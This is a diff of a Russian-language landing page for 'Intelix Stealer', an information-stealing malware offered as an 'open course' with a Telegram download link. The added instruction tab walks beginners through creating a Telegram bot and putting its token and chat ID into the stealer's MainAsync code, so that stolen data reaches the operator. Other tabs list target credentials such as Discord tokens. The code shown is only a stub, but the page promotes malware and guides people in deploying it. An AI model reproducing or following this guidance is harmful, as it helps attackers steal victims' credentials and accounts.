@@ -47,10 +47,6 @@ h1{font-size:clamp(28px,5vw,48px);letter-spacing:-.045em;line-height:1.05;margin
 .download-btn:hover{background:#d93636;transform:translateY(-2px)}
 .download-btn span:last-child{font-size:20px}
 
-.project-link{display:flex;align-items:center;justify-content:space-between;gap:16px;width:100%;max-width:370px;padding:16px 18px;color:#111;background:#f5f5f5;text-decoration:none;font-weight:600;transition:background .2s,transform .2s;margin-bottom:12px;font-size:clamp(13px,3.6vw,14px)}
-.project-link:hover{background:#dcdcdc;transform:translateY(-2px)}
-.project-link span:last-child{font-size:20px}
-
 .backup-link{display:block;font-size:11px;color:#666;text-decoration:none;max-width:370px;padding:6px 0;transition:color .18s;word-break:break-all}
 .backup-link:hover{color:#f04444}
 .backup-link::before{content:"Резерв на случай бана - ";color:#555}
@@ -82,6 +78,81 @@ h1{font-size:clamp(28px,5vw,48px);letter-spacing:-.045em;line-height:1.05;margin
 .panel-content li{font-size:clamp(11px,3.2vw,12px);color:#a8a8a8;padding:5px 0;line-height:1.5;word-break:break-word}
 .panel-content li::before{content:"•";color:#666;margin-right:8px}
 
+/* ===== ИНСТРУКЦИЯ ===== */
+.guide{color:#a8a8a8;font-size:clamp(11px,3.2vw,12px);line-height:1.7}
+.guide p{margin:0 0 12px}
+.guide ol{margin:0 0 14px;padding-left:18px}
+.guide ol li{margin-bottom:10px;color:#a8a8a8;padding-left:2px}
+.guide strong{color:#fff;font-weight:600}
+.guide .step-title{color:#fff;font-weight:600;display:block;margin-bottom:2px}
+.guide .note{margin-top:14px;border-left:2px solid var(--red);padding:10px 14px;background:rgba(240,68,68,.05);color:#f26b6b;font-size:clamp(10px,3vw,11px);line-height:1.65}
+.guide .support{
+  margin-top:14px;
+  border:1px solid rgba(255,255,255,.08);
+  background:rgba(255,255,255,.02);
+  padding:12px 14px;
+  border-radius:4px;
+  font-size:clamp(11px,3vw,12px);
+  color:#bdbdbd;
+  line-height:1.65;
+}
+.guide .support a{color:var(--red);text-decoration:none;word-break:break-all}
+.guide .support a:hover{text-decoration:underline}
+
+/* КОД КАК ИЗ VISUAL STUDIO */
+.code-window{
+  margin:14px 0 18px;
+  border:1px solid #2d2d2d;
+  background:#1e1e1e;
+  border-radius:6px;
+  overflow:hidden;
+  font-family:"Cascadia Code","Consolas","Fira Code","JetBrains Mono",monospace;
+  font-size:clamp(10.5px,2.9vw,12px);
+  line-height:1.6;
+  box-shadow:0 12px 40px rgba(0,0,0,.45);
+}
+.code-titlebar{
+  display:flex;align-items:center;gap:8px;
+  padding:8px 12px;
+  background:#252526;
+  border-bottom:1px solid #2d2d2d;
+  color:#cfcfcf;font-size:11px;
+}
+.code-titlebar .dot{width:10px;height:10px;border-radius:50%}
+.code-titlebar .dot.r{background:#ff5f56}
+.code-titlebar .dot.y{background:#ffbd2e}
+.code-titlebar .dot.g{background:#27c93f}
+.code-titlebar .file{color:#9a9a9a;margin-left:6px;font-size:11px}
+.code-body{
+  display:grid;
+  grid-template-columns:auto 1fr;
+  background:#1e1e1e;
+}
+.code-gutter{
+  background:#1e1e1e;
+  color:#5a5a5a;
+  text-align:right;
+  padding:12px 10px;
+  user-select:none;
+  border-right:1px solid #2d2d2d;
+  font-variant-numeric:tabular-nums;
+  white-space:pre;
+}
+.code-lines{
+  padding:12px 14px;
+  color:#d4d4d4;
+  white-space:pre;
+  overflow-x:auto;
+}
+.code-lines .kw{color:#569cd6}
+.code-lines .type{color:#4ec9b0}
+.code-lines .str{color:#ce9178}
+.code-lines .var{color:#9cdcfe}
+.code-lines .fn{color:#dcdcaa}
+.code-lines .cmt{color:#6a9955}
+.code-lines .num{color:#b5cea8}
+.code-lines .punc{color:#d4d4d4}
+
 .disclaimer{margin-top:20px;border-left:2px solid var(--red);padding:12px 14px;background:rgba(240,68,68,.05);color:#f26b6b;font-size:clamp(10px,3vw,11px);line-height:1.6}
 footer{position:relative;z-index:2;grid-column:1/-1;border-top:1px solid #282828;padding:17px 24px;text-align:center;color:#666;font-size:clamp(10px,2.8vw,11px);background:#0b0b0b}
 
@@ -99,6 +170,7 @@ footer{position:relative;z-index:2;grid-column:1/-1;border-top:1px solid #282828
   .big-panel{max-height:none;min-height:200px}
   .panel-content ul{grid-template-columns:1fr 1fr}
   footer{padding:14px 16px}
+  .code-lines{overflow-x:auto}
 }
 
 @media(max-width:480px){
@@ -137,16 +209,14 @@ footer{position:relative;z-index:2;grid-column:1/-1;border-top:1px solid #282828
     <div class="mark" aria-hidden="true"></div>
     <p class="eyebrow">Open course</p>
     <h1>Intelix<br>Stealer</h1>
-    
-    <a class="download-btn" href="https://t.me/neverliet/100" target="_blank" rel="noopener noreferrer">
+
+    <a class="download-btn" href="https://t.me/neverliet/113" target="_blank" rel="noopener noreferrer">
       <span>Download intelix</span><span aria-hidden="true">↓</span>
     </a>
 
-    <a class="project-link" href="https://t.me/neverliet" target="_blank" rel="noopener noreferrer">
-      <span>Открыть Telegram-канал</span><span aria-hidden="true">↗</span>
-    </a>
     <a class="backup-link" href="https://t.me/neverliet_project" target="_blank" rel="noopener noreferrer">https://t.me/neverliet_project</a>
   </section>
+
   <section class="right">
     <div class="glass">
       <div class="board-head">
@@ -155,7 +225,8 @@ footer{position:relative;z-index:2;grid-column:1/-1;border-top:1px solid #282828
       </div>
 
       <div class="tabs">
-        <div class="tab active" data-tab="messangers">Targets.Messangers</div>
+        <div class="tab active" data-tab="instruction">Инструкция</div>
+        <div class="tab" data-tab="messangers">Targets.Messangers</div>
         <div class="tab" data-tab="game">Target Game</div>
         <div class="tab" data-tab="browsers">Targets.Browsers</div>
         <div class="tab" data-tab="applications">Targets.Applications</div>
@@ -163,7 +234,85 @@ footer{position:relative;z-index:2;grid-column:1/-1;border-top:1px solid #282828
       </div>
 
       <div class="big-panel">
-        <div class="panel-content active" id="messangers">
+        <div class="panel-content active" id="instruction">
+          <h3>Инструкция</h3>
+          <div class="guide">
+            <p>Пошаговая инструкция для новичков. Делай всё по порядку — так быстрее и без ошибок.</p>
+
+            <ol>
+              <li>
+                <span class="step-title">Создай бота в Telegram</span>
+                Открой <strong>@BotFather</strong>, отправь команду <strong>/newbot</strong>, придумай имя и username. В ответ придёт <strong>токен</strong> — сохрани его, он понадобится позже.
+              </li>
+              <li>
+                <span class="step-title">Запусти бота</span>
+                Перейди в только что созданного бота и нажми <strong>Start</strong> (или отправь <strong>/start</strong>). Без этого бот не сможет присылать тебе сообщения.
+              </li>
+              <li>
+                <span class="step-title">Узнай свой Chat ID</span>
+                Открой <strong>@Getmyid_Work_Bot</strong>, нажми Start — он покажет твой числовой <strong>chat id</strong>. Скопируй его.
+              </li>
+              <li>
+                <span class="step-title">Скачай исходники</span>
+                Скачай архив по кнопке <strong>Download intelix</strong> и распакуй его.
+              </li>
+              <li>
+                <span class="step-title">Открой проект в Visual Studio</span>
+                Перенеси папку стилера на рабочий стол, нажми по ней <strong>правой кнопкой мыши</strong> → <strong>«Открыть с помощью»</strong> → <strong>Visual Studio</strong>.
+              </li>
+              <li>
+                <span class="step-title">Найди нужный файл</span>
+                В Visual Studio открой <strong>Обозреватель решений</strong> → <strong>CvMega</strong> → <strong>Plugin</strong> → найди строку <strong>private static async Task MainAsync(string[] args)</strong>.
+              </li>
+              <li>
+                <span class="step-title">Замени токен и chat id</span>
+                В этом блоке кода замени значения <strong>botToken</strong> и <strong>chatId</strong> на свои — токен из @BotFather и chat id из @Getmyid_Work_Bot.
+              </li>
+            </ol>
+
+            <div class="code-window">
+              <div class="code-titlebar">
+                <span class="dot r"></span>
+                <span class="dot y"></span>
+                <span class="dot g"></span>
+                <span class="file">MainAsync.cs</span>
+              </div>
+              <div class="code-body">
+                <div class="code-gutter">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12</div>
+                <div class="code-lines"><span class="kw">private static async</span> <span class="type">Task</span> <span class="fn">MainAsync</span>(<span class="type">string</span>[] <span class="var">args</span>)
+{
+    <span class="type">string</span> <span class="var">botToken</span> = <span class="str">"1234567890:AAExampleFakeTokenDoNotUse123456789"</span>;   <span class="cmt">// замени на токен из @BotFather</span>
+    <span class="type">string</span> <span class="var">chatId</span>   = <span class="str">"123456789"</span>;                                  <span class="cmt">// замени на chat id из @Getmyid_Work_Bot</span>
+    <span class="type">string</span> <span class="var">userName</span>    = <span class="type">Environment</span>.<span class="var">UserName</span>;
+    <span class="type">string</span> <span class="var">machineName</span> = <span class="type">Environment</span>.<span class="var">MachineName</span>;
+    <span class="type">string</span> <span class="var">userIdentifier</span> = <span class="str">$"{userName}@{machineName}"</span>;
+
+    <span class="type">string</span> <span class="var">arguments</span> = <span class="type">string</span>.<span class="fn">Join</span>(<span class="str">" "</span>, <span class="var">args</span>);
+    <span class="type">Console</span>.<span class="fn">WriteLine</span>(<span class="str">"start"</span>);
+}</div>
+              </div>
+            </div>
+
+            <div class="note">выше представлен пример как это должно выглядить</div>
+
+            <div class="support">
+              если что то не понятно пиши сюда — <a href="https://t.me/neverliet?direct" target="_blank" rel="noopener noreferrer">https://t.me/neverliet?direct</a> — тебе помогут
+            </div>
+          </div>
+        </div>
+
+        <div class="panel-content" id="messangers">
           <h3>Targets.Messangers</h3>
           <ul>
             <li>Discord (token)</li>
